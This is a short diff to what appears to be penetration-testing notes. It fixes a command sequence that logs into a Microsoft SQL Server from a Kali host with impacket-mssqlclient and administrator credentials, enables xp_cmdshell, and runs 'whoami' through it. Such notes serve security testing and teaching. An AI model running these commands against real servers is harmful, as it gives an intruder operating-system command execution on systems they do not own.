@@ -49,7 +49,7 @@ Example "locally":
 kali$ impacket-mssqlclient Administrator:thelocaladminpass@$TargetIp -windows-auth
 SQL> execute sp_configure 'show advanced options', 1;
 SQL> reconfigure;
-SQL> execute sp_configure 'xp_cmdshell';
+SQL> execute sp_configure 'xp_cmdshell', 1;
 SQL> reconfigure;
 SQL> execute xp_cmdshell 'whoami';
 ```
